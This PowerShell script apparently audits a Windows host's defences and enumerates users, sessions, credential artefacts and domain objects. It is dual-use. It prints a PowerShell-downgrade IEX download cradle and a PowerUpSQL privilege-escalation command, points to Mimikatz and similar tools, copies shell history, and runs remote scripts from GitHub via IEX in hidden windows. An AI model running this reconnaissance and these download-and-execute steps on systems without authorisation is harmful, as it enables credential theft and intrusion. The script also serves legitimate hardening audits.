$DATE = Get-Date -Format "yyyyMMdd_HHmm"
$USER = $env:USERNAME
$OUT = "$env:USERPROFILE\Downloads\fkad-$DATE-$USER"
New-Item -ItemType Directory -Path $OUT -Force | Out-Null

# Start logging
$logFile = "$OUT\fkad-run.log"
Start-Transcript -Path $logFile -Append -IncludeInvocationHeader

function Banner {
    Write-Host ""
    Write-Host "       _____         _____         _____         _____         _____" -ForegroundColor DarkGray
    Write-Host "     .'     '.     .'     '.     .'     '.     .'     '.     .'     '." -ForegroundColor DarkGray
    Write-Host "    /  o   o  \   /  o   o  \   /  o   o  \   /  o   o  \   /  o   o  \" -ForegroundColor DarkGray
    Write-Host "   |           | |           | |           | |           | |           |" -ForegroundColor DarkGray
    Write-Host "   |  \     /  | |  \     /  | |  \     /  | |  \     /  | |  \     /  |" -ForegroundColor DarkGray
    Write-Host "    \  '---'  /   \  '---'  /   \  '---'  /   \  '---'  /   \  '---'  /" -ForegroundColor DarkGray
    Write-Host "     '._____.'     '._____.'     '._____.'     '._____.'     '._____.' " -ForegroundColor DarkGray
    Write-Host ""
    Write-Host "    fkad local by @fkxdr" -ForegroundColor DarkGray
    Write-Host ""
}

function Run {
    param($Label, $Block, $File)
    try {
        $result = & $Block
        $result | Out-File "$OUT\$File" -Encoding utf8
        Write-Host "[OK]   $Label -> $File" -ForegroundColor Green
    } catch {
        Write-Host "[--]   $Label failed: $_" -ForegroundColor DarkGray
    }
}

function IsAdmin {
    $currentPrincipal = New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent())
    return $currentPrincipal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
}

Banner

Write-Host "[*]   Device: $($env:COMPUTERNAME)" -ForegroundColor DarkGray
Write-Host "[*]   User: $($env:USERNAME)" -ForegroundColor DarkGray
Write-Host ""

$isAdmin = IsAdmin
if ($isAdmin) {
    Write-Host "[OK]   Running as administrator" -ForegroundColor Red
} else {
    Write-Host "[OK]   Not running as administrator" -ForegroundColor Green
}

# Powershell downgrade
try {
    $ps2 = Get-WindowsOptionalFeature -Online -FeatureName MicrosoftWindowsPowerShellV2Root -ErrorAction SilentlyContinue
    $net2 = Get-WindowsOptionalFeature -Online -FeatureName NetFx3 -ErrorAction SilentlyContinue
    if ($ps2.State -eq 'Enabled' -and $net2.State -eq 'Enabled') {
        Write-Host "[KO]   PowerShell downgrade possible (PSv2 + .NET 3.5 present)" -ForegroundColor DarkRed
        Write-Host "       powershell -version 2 -ep bypass -c `"IEX (New-Object Net.WebClient).DownloadString('URL')`"" -ForegroundColor DarkGray
    } else {
        Write-Host "[OK]   PowerShell downgrade not possible" -ForegroundColor Green
    }
} catch {
    Write-Host "       - PowerShell downgrade requires more privs" -ForegroundColor DarkGray
}

# Token Impersonation
if ($isAdmin) {
    try {
        $processes = Get-Process | Where-Object { $_.SessionId -gt 0 }
        if ($processes.Count -gt 1) {
            Write-Host "       - Token impersonation might be possible: https://github.com/Shac0x/Invoke-Totem" -ForegroundColor DarkRed
        }
    } catch {
        Write-Host "       - Token enumeration for impersonation failed" -ForegroundColor DarkYellow
    }
} else {
    Write-Host "       - Token impersonation requires more privs" -ForegroundColor DarkGray
}

# Language Mode Check
$languageMode = $ExecutionContext.SessionState.LanguageMode
if ($languageMode -eq "FullLanguage") {
    Write-Host "[KO]   PowerShell language mode: FullLanguage" -ForegroundColor DarkRed
} elseif ($languageMode -eq "ConstrainedLanguage") {
    Write-Host "[OK]   PowerShell language mode: Constrained Language Mode" -ForegroundColor Green
} else {
    Write-Host "[--]   PowerShell language mode:: $languageMode" -ForegroundColor DarkYellow
}

Write-Host ""

# AMRunningMode Status
$DefenderPreferences = Get-MpPreference
$DefenderStatus = Get-MpComputerStatus
$AMRunningMode = $DefenderStatus.AMRunningMode
if ($AMRunningMode -eq "Normal" -or $AMRunningMode -eq "EDR Blocked") {
    Write-Host "[OK]   Microsoft Defender is running in Active Mode" -ForegroundColor Green
} elseif ($AMRunningMode -eq "Passive" -or $AMRunningMode -eq "SxS Passive Mode") {
    Write-Host "[KO]   Microsoft Defender is running in $AMRunningMode" -ForegroundColor DarkRed
    
} else {
    Write-Host "[??]   Microsoft Defender is running in $AMRunningMode $AMRunningMode" -ForegroundColor DarkYellow
}

# Real-Time Protection
try {
    $realTimeEnabled = $defenderStatus.RealTimeProtectionEnabled
    $monitoringDisabled = $DefenderPreferences.DisableRealtimeMonitoring
    if ($realTimeEnabled -eq $true -or $monitoringDisabled -eq $false) {
        Write-Host "       - Real Time Protection is enabled" -ForegroundColor Green
    } else {
        Write-Host "       [KO] Real Time Protection is disabled" -ForegroundColor DarkRed
    }
} catch {
    Write-Host "       - Real-Time Protection status is unknown" -ForegroundColor DarkYellow
}

# MDE Sensor
try {
    $MDEservice = Get-Service -Name "Sense" -ErrorAction Stop
    if ($MDEservice.Status -eq "Running") {
        Write-Host "       - Microsoft Defender for Endpoint Sensor is enabled" -ForegroundColor Green
    } else {
        Write-Host "       - Microsoft Defender for Endpoint Sensor is disabled" -ForegroundColor DarkRed
    }
} catch {
    Write-Host "       - Microsoft Defender for Endpoint Sensor is disabled" -ForegroundColor DarkRed
}

# Network Protection
try {
    $NetworkProtectionValue = (Get-MpPreference).EnableNetworkProtection
    if ($NetworkProtectionValue -eq 1) {
        Write-Host "       - Microsoft Defender for Endpoint Network Protection is enabled" -ForegroundColor Green
    } elseif ($NetworkProtectionValue -eq 0) {
        Write-Host "       - Microsoft Defender for Endpoint Network Protection is disabled" -ForegroundColor DarkRed
    } elseif ($NetworkProtectionValue -eq 2) {
        Write-Host "       - Microsoft Defender for Endpoint Network Protection is in audit mode" -ForegroundColor DarkYellow
    }
} catch {
    Write-Host "       - Microsoft Defender for Endpoint Network Protection can not be queried" -ForegroundColor DarkYellow
}

# Tamper Protection
$TamperProtectionStatus = $DefenderStatus.IsTamperProtected
$TamperProtectionManage = $DefenderStatus.TamperProtectionSource

if ($TamperProtectionStatus -eq $true) {
    Write-Host "       - Tamper Protection is enabled" -ForegroundColor Green
} else {
    Write-Host "       - Tamper Protection is disabled" -ForegroundColor DarkRed
}

# Behavior Monitoring
if (-not $DefenderPreferences.DisableBehaviorMonitoring) {
    Write-Host "       - Behavior Monitoring is enabled" -ForegroundColor Green
} else {
    Write-Host "       - Behavior Monitoring is disabled" -ForegroundColor DarkRed
}

# Memory Integrity
try {
    if (Test-Path "HKLM:\SYSTEM\CurrentControlSet\Control\DeviceGuard\Scenarios\HypervisorEnforcedCodeIntegrity") {
        $hvciStatus = (Get-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Control\DeviceGuard\Scenarios\HypervisorEnforcedCodeIntegrity").Enabled
        if ($hvciStatus -eq 1) {
            Write-Host "       - Memory Integrity is enabled" -ForegroundColor Green
        } else {
            Write-Host "       - Memory Integrity is disabled" -ForegroundColor DarkRed
        }
    } else {
        Write-Host "       - Memory Integrity requires more permissions to view" -ForegroundColor DarkGray
    }
} catch {
    Write-Host "       - Memory Integrity is unknown" -ForegroundColor DarkYellow
}

# Exclusions
if ($isAdmin) {
    $exclusionExtensions = $DefenderPreferences.ExclusionExtension
    $exclusionPaths = $DefenderPreferences.ExclusionPath
    $exclusionProcesses = $DefenderPreferences.ExclusionProcess
    
    $hasAnyExclusions = ($exclusionExtensions -and $exclusionExtensions.Count -gt 0) -or `
                        ($exclusionPaths -and $exclusionPaths.Count -gt 0) -or `
                        ($exclusionProcesses -and $exclusionProcesses.Count -gt 0)
    
    if ($hasAnyExclusions) {
        Write-Host "[KO]   Exclusions found" -ForegroundColor DarkRed
        if ($exclusionExtensions -and $exclusionExtensions.Count -gt 0) {
            Write-Host "       - Extension exclusions found" -ForegroundColor DarkRed
        }
        if ($exclusionPaths -and $exclusionPaths.Count -gt 0) {
            Write-Host "       - Path exclusions found" -ForegroundColor DarkRed
        }
        if ($exclusionProcesses -and $exclusionProcesses.Count -gt 0) {
            Write-Host "       - Process exclusions found" -ForegroundColor DarkRed
        }
    } else {
        Write-Host "[OK]   No exclusions found" -ForegroundColor Green
    }

# Exclusions through event ID    
} else {
    $LogName = "Microsoft-Windows-Windows Defender/Operational"
    $EventID = 5007
    $foundExclusions = @()
    try {
        $ExclusionEvents = Get-WinEvent -LogName $LogName -ErrorAction SilentlyContinue | Where-Object { $_.Id -eq $EventID -and $_.Message -match "Exclusions" } | Select-Object -First 10
        foreach ($Event in $ExclusionEvents) {
            if ($Event.Message -match "\\Exclusions\\Paths\\") {
                $foundExclusions += $Event.Message
            }
        }
        if ($foundExclusions.Count -gt 0) {
            Write-Host "[KO]   Exclusions detected via event logs" -ForegroundColor DarkRed
            foreach ($path in $foundExclusions) {
                Write-Host "       - $path" -ForegroundColor DarkGray
            }
        } else {
            Write-Host "       - Exclusions require more privs. Attempted bypass (eventlog 5007) but none were found" -ForegroundColor DarkGray
        }
    } catch {
        Write-Host "       - Exclusions require more privs. Attempted bypass (eventlog 5007) but none were found" -ForegroundColor DarkGray
    }
}


# ASR Rules
$asrRulesDefinitions = @{
    "BE9BA2D9-53EA-4CDC-84E5-9B1EEEE46550" = "Block executable content from email client and webmail"
    "D4F940AB-401B-4EFC-AADC-AD5F3C50688A" = "Block all Office applications from creating child processes"
    "3B576869-A4EC-4529-8536-B80A7769E899" = "Block Office applications from creating executable content"
    "75668C1F-73B5-4CF0-BB93-3ECF5CB7CC84" = "Block Office apps from injecting code into processes"
    "D3E037E1-3EB8-44C8-A917-57927947596D" = "Block JS or VBS from launching downloaded executable content"
    "5BEB7EFE-FD9A-4556-801D-275E5FFC04CC" = "Block execution of potentially obfuscated scripts"
    "92E97FA1-2EDF-4476-BDD6-9DD0B4DDDC7B" = "Block Win32 API calls from Office macros"
    "01443614-CD74-433A-B99E-2ECDC07BFC25" = "Block executable files unless prevalence or age criteria met"
    "C1DB55AB-C21A-4637-BB3F-A12568109D35" = "Use advanced protection against ransomware"
    "9E6C4E1F-7D60-472F-BA1A-A39EF669E4B2" = "Block credential stealing from lsass.exe"
    "D1E49AAC-8F56-4280-B9BA-993A6D77406C" = "Block process creations from PSExec and WMI commands"
    "B2B3F03D-6A65-4F7B-A9C7-1C7EF74A9BA4" = "Block untrusted and unsigned processes from USB"
    "26190899-1602-49E8-8B27-EB1D0A1CE869" = "Block Office communication application from creating child processes"
    "7674BA52-37EB-4A4F-A9A1-F0F9A1619A2C" = "Block Adobe Reader from creating child processes"
    "E6DB77E5-3DF2-4CF1-B95A-636979351E5B" = "Block persistence through WMI event subscription"
    "56A863A9-875E-4185-98A7-B882C64B5CE5" = "Block abuse of exploited vulnerable signed drivers"
    "33DDEDF1-C6E0-47CB-833E-DE6133960387" = "Block rebooting machine in Safe Mode"
    "C0033C00-D16D-4114-A5A0-DC9B3A7D2CEB" = "Block use of copied or impersonated system tools"
    "A8F5898E-1DC8-49A9-9878-85004B8A61E6" = "Block Webshell creation for Servers"
}
if (IsAdmin) {
    $asrStatuses = Get-MpPreference | Select-Object -ExpandProperty AttackSurfaceReductionRules_Actions
    $asrRuleGuids = Get-MpPreference | Select-Object -ExpandProperty AttackSurfaceReductionRules_Ids
    $disabledCount = 0
    foreach ($guid in $asrRuleGuids) {
        $index = [array]::IndexOf($asrRuleGuids, $guid)
        if ($asrStatuses[$index] -ne 1) {
            $disabledCount++
        }
    }
    if ($disabledCount -gt 0) {
        Write-Host "       - some $disabledCount ASR rule(s) not enabled" -ForegroundColor DarkRed
        foreach ($guid in $asrRuleGuids) {
            $index = [array]::IndexOf($asrRuleGuids, $guid)
            if ($asrStatuses[$index] -ne 1) {
                $ruleName = $asrRulesDefinitions[$guid]
                if ($ruleName) {
                    Write-Host "       - $ruleName" -ForegroundColor DarkGray
                }
            }
        }
    } else {
        Write-Host "       - all ASR rules are enabled" -ForegroundColor Green
    }
} else {
    Write-Host "       - ASR rule enumeration requires more privs" -ForegroundColor DarkGray
}

Write-Host ""

# BitLocker
$bitlockerStatus = (New-Object -ComObject Shell.Application).NameSpace('C:').Self.ExtendedProperty('System.Volume.BitLockerProtection')
if ($bitlockerStatus -eq 1) {
    Write-Host "[OK]   C: drive is BitLocker encrypted" -ForegroundColor Green
} elseif ($bitlockerStatus -eq 2) {
    Write-Host "[KO]   C: drive is not BitLocker encrypted" -ForegroundColor DarkRed
} else {
    Write-Host "[??]   C: drive BitLocker encryption is unknown" -ForegroundColor DarkYellow
}


# WDAC
try {
    $cipolicies = Get-CimInstance -ClassName Win32_DeviceGuard -Namespace root\Microsoft\Windows\DeviceGuard -ErrorAction Stop
    $codeIntegrityStatus = $cipolicies.CodeIntegrityPolicyEnforcementStatus
    $userModeStatus = $cipolicies.UsermodeCodeIntegrityPolicyEnforcementStatus

    $policyDir = "$env:windir\System32\CodeIntegrity\CiPolicies\Active"
    $policyCount = 0
    if (Test-Path $policyDir) {
        $activePolicies = Get-ChildItem -Path $policyDir -Filter "*.cip" -ErrorAction SilentlyContinue
        $policyCount = $activePolicies.Count
    }

    if ($policyCount -gt 0) {
        Write-Host "[OK]   WDAC Active Policies: $policyCount policies deployed" -ForegroundColor Green
    } else {
        Write-Host "[KO]   WDAC Active Policies: No policies deployed" -ForegroundColor DarkRed
    }

    $ciLabel = switch ($codeIntegrityStatus) { 0 { "Off" } 1 { "Audit Mode" } 2 { "Enforced" } Default { "Unknown" } }
    $ciColor = switch ($codeIntegrityStatus) { 2 { "Green" } 1 { "DarkYellow" } Default { "DarkRed" } }
    $ciStatus = switch ($codeIntegrityStatus) { 2 { "[OK]" } 1 { "[??]" } Default { "[KO]" } }
    Write-Host "       - Kernel Mode Code Integrity: $ciLabel" -ForegroundColor $ciColor

    $umciLabel = switch ($userModeStatus) { 0 { "Off" } 1 { "Audit Mode" } 2 { "Enforced" } Default { "Unknown" } }
    $umciColor = switch ($userModeStatus) { 2 { "Green" } 1 { "DarkYellow" } Default { "DarkRed" } }
    $umciStatus = switch ($userModeStatus) { 2 { "[OK]" } 1 { "[??]" } Default { "[KO]" } }
    Write-Host "       - User Mode Code Integrity: $umciLabel" -ForegroundColor $umciColor

} catch {
    Write-Host "[??]   WDAC: Unable to query" -ForegroundColor DarkYellow
}

# AppLocker
try {
    $applockerService = Get-Service -Name "AppIDSvc" -ErrorAction Stop
    if ($applockerService.Status -eq "Running") {
        Write-Host "[OK]   AppLocker Service (AppIDSvc) is running" -ForegroundColor Green
    } else {
        Write-Host "[KO]   AppLocker Service (AppIDSvc) is not running" -ForegroundColor DarkRed
    }
} catch {
    Write-Host "[KO]   AppLocker Service (AppIDSvc) was not found" -ForegroundColor DarkRed
}

$applockerRegPath = "HKLM:\SOFTWARE\Policies\Microsoft\Windows\SrpV2"
$applockerConfigured = $false
$applockerCollections = @("Exe", "Msi", "Script", "Dll", "Appx")
foreach ($collection in $applockerCollections) {
    $collPath = "$applockerRegPath\$collection"
    if (Test-Path $collPath) {
        $rules = Get-ChildItem -Path $collPath -ErrorAction SilentlyContinue
        if ($rules.Count -gt 0) {
            $applockerConfigured = $true
            Write-Host "AppLocker $collection Rules :                                    [KO] $($rules.Count) rule(s) configured" -ForegroundColor DarkRed
        }
    }
}
if (-not $applockerConfigured) {
    Write-Host "       - There are no baselines or rules configured" -ForegroundColor DarkRed
}

# Edge SmartScreen
$edgeSSvalue = $null
$policyPaths = @(
    "HKLM:\SOFTWARE\Policies\Microsoft\Edge",
    "HKCU:\SOFTWARE\Policies\Microsoft\Edge"
)
foreach ($path in $policyPaths) {
    if (Test-Path $path) {
        try {
            $edgeSSvalue = Get-ItemPropertyValue -Path $path -Name "SmartScreenEnabled" -ErrorAction Stop
            break
        } catch {}
    }
}
if ($edgeSSvalue -eq 0) {
    Write-Host "[KO]   Microsoft Edge SmartScreen is disabled" -ForegroundColor DarkRed
} else {
    Write-Host "[OK]   Microsoft Edge SmartScreen is enabled" -ForegroundColor Green
}

# SCCM/SCOM Enumeration
try {
    $smContainer = Get-ADObject -Filter {Name -eq "System Management"} -SearchBase $([ADSI]"LDAP://RootDSE").defaultNamingContext -ErrorAction Stop
    
    if ($smContainer) {
        Write-Host "[KO]   System Center infrastructure detected (SCCM/SCOM)" -ForegroundColor DarkRed
        Write-Host "       - SCCM: Use SharpSCCM - https://github.com/Mayyhem/SharpSCCM" -ForegroundColor DarkGray
        Write-Host "       - SCOM: Use SharpSCOM - https://github.com/breakfix/SharpSCOM" -ForegroundColor DarkGray
    }
} catch {
    Write-Host "[OK]   No System Center (SCCM/SCOM) infrastructure detected" -ForegroundColor Green
}


# MSSQL Enumeration
$instances = @()
try {
    if (Test-Path "HKLM:\SOFTWARE\Microsoft\Microsoft SQL Server\Instance Names\SQL") {
        $regProps = Get-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Microsoft SQL Server\Instance Names\SQL"
        foreach ($prop in $regProps.PSObject.Properties) {
            if ($prop.Name -notmatch "PS|Item|Drive|Path") {
                $instances += $prop.Value
            }
        }
    }
} catch { }
try {
    $wmiInstances = Get-WmiObject -Class Win32_Service | Where-Object { $_.Name -like "MSSQL*" } | Select-Object -ExpandProperty Name
    $instances += $wmiInstances
} catch { }
$instances = $instances | Sort-Object -Unique
if ($instances) {
    $mssqlLog = "$OUT\mssql_enum.txt"
    "[KO]   MSSQL Instances Found:`n$($instances -join "`n")" | Add-Content $mssqlLog
    "`nPowerUpSQL Enumeration:`nIEX (iwr 'https://raw.githubusercontent.com/NetSPI/PowerUpSQL/master/PowerUpSQL.ps1').Content" | Add-Content $mssqlLog
    "Get-SQLInstanceDomain | Get-SQLConnectionTestThreaded | Where-Object {`$_.Status -eq 'Accessible'} | Get-SQLServerPrivEscRowThreated" | Add-Content $mssqlLog
    "`nExploit References:`n- PowerUpSQL: https://github.com/NetSPI/PowerUpSQL`n- xp_cmdshell abuse, impersonation, linked servers" | Add-Content $mssqlLog
    foreach ($instance in $instances) {
        $regPath = "HKLM:\SOFTWARE\Microsoft\Microsoft SQL Server\$instance\MSSQLServer"
        try {
            $service = Get-WmiObject -Class Win32_Service | Where-Object { $_.Name -eq $instance }
            if ($service) {
                "`nInstance: $instance`nService Account: $($service.StartName)`nState: $($service.State)" | Add-Content $mssqlLog
                if ($service.StartName -match "SYSTEM|LocalService|NetworkService") {
                    "[!] CRITICAL: Service runs as $($service.StartName)" | Add-Content $mssqlLog
                }
            }
        } catch { }
        try {
            $port = (Get-ItemProperty -Path "$regPath\Tcp\IPAll" -Name "TcpPort" -ErrorAction SilentlyContinue).TcpPort
            if ($port) { "TCP Port: $port" | Add-Content $mssqlLog }
        } catch { }
        try {
            if ((Get-ItemProperty -Path "$regPath\SuperSocketNetLib\Np" -Name "Enabled" -ErrorAction SilentlyContinue).Enabled -eq 1) {
                "[!] Named Pipes enabled (lateral movement vector)" | Add-Content $mssqlLog
            }
        } catch { }
    }
    Write-Host "[KO]   MSSQL instances detected -> mssql_enum.txt" -ForegroundColor DarkRed
    Write-Host "       - PowerUpSQL: https://github.com/NetSPI/PowerUpSQL" -ForegroundColor DarkGray
} else {
    Write-Host "[OK]   No MSSQL instances detected" -ForegroundColor Green
}

Write-Host ""

Run "Privileges (whoami /all)" { whoami /all } "whoami_all.txt"

Run "DNS Cache" { ipconfig /displaydns } "dns_cache.txt"

# Admins and logged on users
$adminOutput = net localgroup administrators
$loggedOutput = query user 2>$null
$combined = @()
$combined += "=== LOCAL ADMINS ===" 
$combined += $adminOutput
$combined += "`n=== LOGGED ON USERS ==="
$combined += $loggedOutput
$combined | Out-File "$OUT\users_and_admins.txt" -Encoding utf8
Write-Host "[OK]   Users & Admins -> users_and_admins.txt" -ForegroundColor Green

Run "Scheduled Tasks" { Get-ScheduledTask | Format-Table -AutoSize } "scheduled_tasks.txt"

# Check WSL
try {
    $wslJob = Start-Job { wsl --list --verbose 2>&1 }
    $wsl = $wslJob | Wait-Job -Timeout 5 | Receive-Job
    Remove-Job $wslJob -Force
    if ($wsl -match "NAME") {
        Write-Host "[KO]   WSL is installed and has distributions" -ForegroundColor DarkRed
        foreach ($line in $wsl) {
            if ($line -match "\S") {
                Write-Host "       $line" -ForegroundColor DarkGray
            }
        }
    } else {
        Write-Host "[OK]   WSL is not installed or no distributions" -ForegroundColor Green
    }
} catch {
    Write-Host "[OK]   WSL is not installed or no distributions" -ForegroundColor Green
}

# Startup items
$startupOutput = Get-CimInstance Win32_StartupCommand |
    Where-Object { $_.Command -notmatch "SecurityHealthSystray|Windows Defender|MpCmdRun" } |
    Format-Table -AutoSize

if ($startupOutput) {
    $startupOutput | Out-File "$OUT\startup_items.txt" -Encoding utf8
    Write-Host "[KO]   Startup items found -> startup_items.txt" -ForegroundColor Red
} else {
    Write-Host "[OK]   No non-standard startup items found" -ForegroundColor Green
}

# MSI repairing
$msiOutput = Get-WmiObject -Class Win32_Product |
    Where-Object { $_.Vendor -notin @("Microsoft Corporation","Microsoft","Python Software Foundation","Parallels International GmbH") } |
    ForEach-Object {
        [PSCustomObject]@{
            Name = $_.Name
            Vendor = $_.Vendor
            Version = $_.Version
        }
    }

if ($msiOutput) {
    $msiOutput | Out-File "$OUT\msi_list.txt" -Encoding utf8
    Write-Host "[KO]   MSI repair LPE possible -> msi_list.txt" -ForegroundColor DarkRed
} else {
    Write-Host "[OK]   No MSI repair LPE vectors found" -ForegroundColor Green
}

Write-Host ""

# Tombstone deleted AD objects
try {
    if (Get-Module -ListAvailable -Name ActiveDirectory -ErrorAction SilentlyContinue) {
        $Deleted = Get-ADObject -Filter {isDeleted -eq $true} -IncludeDeletedObjects `
            -Properties Name, ObjectClass, whenChanged, LastKnownParent `
            | Where-Object { $_.ObjectClass -in @("user","computer","group") }
        if ($Deleted) {
            $Count = ($Deleted | Measure-Object).Count
            $Deleted | Select-Object Name, ObjectClass, whenChanged, LastKnownParent | Out-File "$OUT\tombstone.txt" -Encoding utf8
            Write-Host "[KO]   $Count deleted object(s) in tombstone -> tombstone.txt" -ForegroundColor DarkRed
            $Interesting = $Deleted | Where-Object { $_.Name -match "svc|admin|backup|sql|service|mgmt" }
            if ($Interesting) {
                $Interesting | ForEach-Object { Write-Host "       - $($_.Name) [$($_.ObjectClass)]" -ForegroundColor DarkGray }
            }
        } else {
            Write-Host "[OK]   No deleted objects in tombstone" -ForegroundColor Green
        }
    } else {
        $Domain = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
        $DN = "DC=" + ($Domain.Name -replace "\.", ",DC=")
        $Searcher = New-Object System.DirectoryServices.DirectorySearcher
        $Searcher.SearchRoot = New-Object System.DirectoryServices.DirectoryEntry("LDAP://CN=Deleted Objects,$DN")
        $Searcher.Filter = "(isDeleted=TRUE)"
        $Searcher.SearchScope = "OneLevel"
        $Searcher.Tombstone = $true
        $Searcher.PropertiesToLoad.AddRange(@("name","objectclass","whenchanged"))
        $Results = $Searcher.FindAll()
        if ($Results.Count -gt 0) {
            $Results | ForEach-Object { "$($_.Properties['name']) [$($_.Properties['objectclass'][-1])]" } | Out-File "$OUT\tombstone.txt" -Encoding utf8
            Write-Host "[KO]   $($Results.Count) deleted object(s) in tombstone -> tombstone.txt" -ForegroundColor DarkRed
        } else {
            Write-Host "[OK]   No deleted objects in tombstone" -ForegroundColor Green
        }
    }
} catch {
    Write-Host "[--]   Tombstone check failed, is the device AD joined?" -ForegroundColor DarkOrange
}

# RDP connections
try {
    $rdp = reg query "HKCU\Software\Microsoft\Terminal Server Client\Default" 2>$null
    if ($rdp -match "MRU") {
        Write-Host "[KO]   RDP saved servers found -> rdp_servers.txt" -ForegroundColor DarkRed
        $rdp | Out-File "$OUT\rdp_servers.txt"
    } else {
        Write-Host "[OK]   No saved RDP servers found" -ForegroundColor Green
    }
} catch {
    Write-Host "[--]   RDP enumeration failed" -ForegroundColor DarkYellow
}

# PuTTY sessions
try {
    $putty = reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" 2>$null
    if ($putty -match "Sessions") {
        Write-Host "[KO]   PuTTY sessions configured -> putty_sessions.txt" -ForegroundColor DarkRed
        $putty | Out-File "$OUT\putty_sessions.txt"
    } else {
        Write-Host "[OK]   No PuTTY sessions found" -ForegroundColor Green
    }
} catch {
    Write-Host "[??]   PuTTY enumeration skipped" -ForegroundColor DarkYellow
}

# DPAPI Artefacts Check
try {
    $dpapi = Get-ChildItem -Path "$env:APPDATA\Microsoft\Credentials" -ErrorAction SilentlyContinue
    if ($dpapi -and $dpapi.Count -gt 0) {
        Write-Host "[??]   DPAPI encrypted credentials found ($($dpapi.Count))" -ForegroundColor DarkYellow
        Write-Host "       - Use SharpDPAPI or Mimikatz for decryption" -ForegroundColor DarkGray
    } else {
        Write-Host "[OK]   No DPAPI credentials found" -ForegroundColor Green
    }
} catch {
    Write-Host "[OK]   DPAPI check skipped" -ForegroundColor Green
}

# SSH keys
if (Test-Path "$env:USERPROFILE\.ssh") {
    Write-Host "[KO]   SSH keys found -> ssh_keys.txt" -ForegroundColor DarkRed
    Get-ChildItem "$env:USERPROFILE\.ssh" | Out-File "$OUT\ssh_keys.txt"
} else {
    Write-Host "[OK]   No SSH keys found" -ForegroundColor Green
}

# PowerShell history
$histFile = "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt"
if (Test-Path $histFile) {
    Copy-Item $histFile "$OUT\powershell_history.txt" -ErrorAction SilentlyContinue
    $sensitive = Select-String -Path $histFile -Pattern "password|passwd|pwd|pass=|api.?key|token|secret|credential|auth|login" -ErrorAction SilentlyContinue
    if ($sensitive) {
        Write-Host "[KO]   There might be sensitive commands in PowerShell history -> powershell_history.txt" -ForegroundColor DarkRed
    } else {
        Write-Host "[OK]   PowerShell history found -> powershell_history.txt" -ForegroundColor Green
    }
} else {
    Write-Host "[OK]   No PowerShell history found" -ForegroundColor Green
}

Write-Host ""

# PrivescCheck
try {
    $cmd = "IEX (New-Object Net.WebClient).DownloadString('https://github.com/itm4n/PrivescCheck/releases/latest/download/PrivescCheck.ps1'); Invoke-PrivescCheck -Extended -Audit -Report '$OUT\PrivescCheck' -Format HTML"
    Start-Process powershell -ArgumentList "-NoProfile -Command `"$cmd`"" -WindowStyle Hidden -Wait
    Write-Host "[OK]   PrivescCheck -> PrivescCheck.html" -ForegroundColor Green
} catch {
    Write-Host "[--]   PrivescCheck failed: $_" -ForegroundColor DarkYellow
}

# ScriptSentry
try {
    $cmd = "IEX (Invoke-WebRequest 'https://raw.githubusercontent.com/techspence/ScriptSentry/main/Invoke-ScriptSentry.ps1').Content; Invoke-ScriptSentry *>&1 | Out-File '$OUT\scriptsentry.txt' -Encoding utf8"
    Start-Process powershell -ArgumentList "-NoProfile -Command `"$cmd`"" -WindowStyle Hidden -Wait
    Write-Host "[OK]   ScriptSentry -> scriptsentry.txt" -ForegroundColor Green
} catch {
    Write-Host "[--]   ScriptSentry failed: $_" -ForegroundColor DarkYellow
}

# HardeningKitty
try {
    $hardKittyDir = "$env:TEMP\HardeningKitty"
    New-Item -ItemType Directory -Path "$hardKittyDir\lists" -Force | Out-Null
    Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/scipag/HardeningKitty/master/HardeningKitty.psm1' -OutFile "$hardKittyDir\HardeningKitty.psm1" -ErrorAction Stop
    $lists = @('finding_list_0x6d69636b_machine.csv','finding_list_0x6d69636b_user.csv','finding_list_cis_microsoft_windows_10_enterprise_22h2_3.0.0_machine.csv','finding_list_cis_microsoft_windows_10_enterprise_22h2_3.0.0_user.csv','finding_list_cis_microsoft_windows_11_enterprise_23h2_machine.csv','finding_list_cis_microsoft_windows_11_enterprise_23h2_user.csv','finding_list_cis_microsoft_windows_server_2019_1809_3.0.0_machine.csv','finding_list_cis_microsoft_windows_server_2022_22h2_3.0.0_machine.csv')
    foreach ($list in $lists) {
        Invoke-WebRequest -Uri "https://raw.githubusercontent.com/scipag/HardeningKitty/master/lists/$list" -OutFile "$hardKittyDir\lists\$list" -ErrorAction SilentlyContinue
    }
    Push-Location $hardKittyDir
    $output = powershell -ExecutionPolicy Bypass -Command "Import-Module '$hardKittyDir\HardeningKitty.psm1' -Force; Invoke-HardeningKitty -Mode Audit" 2>&1
    Pop-Location
    $filtered = $output | Where-Object { $_ -notmatch '^\[!\]' -and $_ -notmatch '^\[+\]' -and $_ -notmatch 'Severity=Low' -and $_ -notmatch 'Severity=Passed' }
    $filtered | Out-File "$OUT\HardeningKitty.txt" -Encoding utf8
    Write-Host "[OK]   HardeningKitty (Medium+ only) -> HardeningKitty.txt" -ForegroundColor Green
} catch {
    Write-Host "[--]   HardeningKitty failed: $_" -ForegroundColor DarkYellow
}

# PingCastle
try {
    $pingCastleUrl = "https://github.com/netwrix/pingcastle/releases/download/3.4.2.66/PingCastle_3.4.2.66.zip"
    $pingCastlePath = "$env:TEMP\PingCastle_3.4.2.66.zip"
    $pingCastleDir = "$env:TEMP\PingCastle"
    Invoke-WebRequest -Uri $pingCastleUrl -OutFile $pingCastlePath -UseBasicParsing
    Expand-Archive -Path $pingCastlePath -DestinationPath $pingCastleDir -Force
    Push-Location $pingCastleDir
    & ".\PingCastle.exe" --healthcheck --datefile 2>&1
    Pop-Location

    if ($output -match "not connected to a domain") {
        Write-Host "[--]   PingCastle: Computer is not connected to a domain" -ForegroundColor DarkYellow
    } else {
        Move-Item -Path "$pingCastleDir\*.html" -Destination "$OUT\PingCastle.html" -Force -ErrorAction SilentlyContinue
        Write-Host "[OK]   PingCastle -> PingCastle.html (3.4.2.66, last version before Netwrix (October 25)" -ForegroundColor Green
    }
} catch {
    Write-Host "[--]   PingCastle failed: $_" -ForegroundColor DarkYellow
}

Write-Host ""
Write-Host "[OK] Done. Output folder: $OUT" -ForegroundColor Green
Stop-Transcript | Out-Null
Write-Host ""
